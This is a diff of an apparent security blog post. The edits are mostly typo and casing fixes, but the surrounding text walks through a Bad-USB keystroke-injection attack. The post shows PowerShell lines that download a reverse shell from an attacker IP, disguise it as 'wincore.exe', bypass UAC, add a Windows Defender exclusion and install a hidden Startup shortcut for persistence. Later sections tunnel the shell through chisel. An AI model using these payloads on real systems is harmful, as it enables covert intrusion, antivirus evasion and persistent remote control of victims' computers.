@@ -20,7 +20,7 @@ A reverse shell is great, but what if he stayed, no matter what? Using a Bad-USB
 
 ### The shell
 
-First, we need our shell. This will be an executable written in `dotnet core 3.1` ([source](https://www.puckiestyle.nl/c-simple-reverse-shell/)):
+First, we need our shell. This will be an executable written in `dotNet core 3.1` ([source](https://www.puckiestyle.nl/c-simple-reverse-shell/)):
 
 ```C#
 using System;
@@ -103,9 +103,9 @@ namespace Shell1
 }
 ```
 
-This code creates a reverse shell to the gives IP address, which is restarted every minute after closing. But this program has to be started by a user after every reboot. And the users won't just trust every program, so we need something to get the executable on the victim's system without their knowledge. Here the Bad-USB comes into play. For this example I used my WHID-Cactus, but it can be rewritten and used on any Bad-USB. I only changed the contents of the main method, so that the shell would reconnect after a minute.
+This code creates a reverse shell to the gives IP address, which is restarted every minute after closing. But this program has to be started by a user after every reboot. And the users won't just trust every program, so we need something to get the executable on the victim's system without their knowledge. Here the Bad-USB comes into play. For this example, I used my WHID-Cactus, but it can be rewritten and used on any Bad-USB. I only changed the contents of the main method, so that the shell would reconnect after a minute.
 
-```whid
+```powershell
 Press:131+114
 Print:powershell
 Press:128+129+176
@@ -136,7 +136,7 @@ Press:128+129+176
 Press:216+176
 ```
 
-The first line uses the Arduino codes again to press `control`, `shift` and `enter`. This will run the given command (`powershell`) as administrator, we need this to disable Windows Defender. The second line will type the left arrow and `enter`, so that the UAC (admin-prompt) is answered with `yes`.
+The first line uses the Arduino codes again to press `control`, `shift` and `enter`. This will run the given command (`powershell`) as an administrator, we need this to disable Windows Defender. The second line will type the left arrow and `enter` so that the UAC (admin-prompt) is answered with `yes`.
 
 ```powershell
 PrintLine:(New-Object System.Net.WebClient).DownloadFile("http://192.168.241.1/shell.exe", "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe")
@@ -149,7 +149,7 @@ This is where the juicy stuff starts, first we download the `shell.exe` and a `v
 CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
 ```
 
-Why do we need this? This little script runs an executable completely hidden. Only far into taskmanager can you find the process, but nobody expects a process called `wincore` to be evil.
+Why do we need this? This little script runs an executable completely hidden. Only far into task manager can you find the process, but nobody expects a process called `wincore` to be evil.
 
 Both files are downloaded into `C:\users\{user}\AppData\Local\Microsoft\Windows\0\`, a folder very little people dare to even open, this is just another step to make the shell look like a windows process to "normal" people.
 
@@ -157,7 +157,7 @@ Both files are downloaded into `C:\users\{user}\AppData\Local\Microsoft\Windows\
 PrintLine:Add-MpPreference -ExclusionProcess "wincore.exe"
 ```
 
-This line is the reason that powershell must start with privileges, this line makes a exclusion in Defender for all the processes named `wincore.exe`. This allows the shell to run without any interjection from Windows Defender.
+This line is the reason that Powershell must start with privileges, this line makes a exclusion in Defender for all the processes named `wincore.exe`. This allows the shell to run without any interjection from Windows Defender.
 
 ```powershell
 PrintLine:$s = (New-Object -comObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wincore.lnk"); $s.TargetPath="C:\Windows\System32\wscript.exe";$s.Arguments="`"$env:APPDATA\..\Local\Microsoft\Windows\0\start.vbs`" `"C:\Users\admin\AppData\Local\Microsoft\Windows\0\wincore.exe`""; $s.Save();
@@ -171,13 +171,13 @@ PrinteLine:C:\Windows\System32\wscript.exe "C:\Users\admin\AppData\Roaming\..\Lo
 
 This is simply the content of the shortcut.
 
-We end the script with `exit`, so the user does not see that something is up. Currently, the script consists of multiple lines executed in powershell, but if it is rewritten to one powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the usb is pulled out.
+We end the script with `exit`, so the user does not see that something is up. Currently, the script consists of multiple lines executed in Powershell, but if it is rewritten to one Powershell command that runs in the background, this injection can take only a few seconds to be ready. The execution then happens on the background, even when the USB is pulled out.
 
 ## Revision
 
-So, I have been asked to give a short presentation on this subject, and I decided that I can go futher for this presentation. So, I looked into more parts of this in order to create a better payload.
+So, I have been asked to give a short presentation on this subject, and I decided that I can go further for this presentation. So, I looked into more parts of this to create a better payload.
 
-For this, I wanted a few things, first, a different shell. After some googling I found this one: [C-Reverse-Shell](https://github.com/dev-frog/C-Reverse-Shell). A reverse shell written in C++, undetected by windows defender, this removed a step from my payload and also removed the need for Administrator rights. The next step was to make the executing way quicker. This was achieved by downloading and executing the script and the background, so that no time is wasted on typing.This is the result:
+For this, I wanted a few things, first, a different shell. After some googling, I found this one: [C-Reverse-Shell](https://github.com/dev-frog/C-Reverse-Shell). A reverse shell written in C++, undetected by windows defender, this removed a step from my payload and also removed the need for Administrator rights. The next step was to make the executing way quicker. This was achieved by downloading and executing the script and the background so that no time is wasted on typing. This is the result:
 
 When the cactus is inserted, this payload is executed:
 
@@ -210,8 +210,8 @@ $path = Resolve-Path "$env:APPDATA\..\Local\Microsoft\Windows\0\wincore.exe"
 Start-Process -FilePath $path 
 ```
 
-This starts the `chisel` client and connects to my server. Forwarding to local port 8090 to the attackers port 8090. Then it starts the reverse shell, which connects to `127.0.0.1:8090`, forwarded to the attackers machine.
+This starts the `chisel` client and connects to my server. Forwarding to local port 8090 to the attackers port 8090. Then it starts the reverse shell, which connects to `127.0.0.1:8090`, forwarded to the attacker's machine.
 
 ![shark](https://raw.githubusercontent.com/Riqky/riqky.github.io/master/assets/images/shark.png)
 
-Now, the downside of chisel is that it generates a lot more traffic, however, it is not just plain tcp traffic and it can be encrypted with SSL.
+Now, the downside of Chisel is that it generates a lot more traffic, however, it is not just plain tCP traffic and it can be encrypted with SSL.
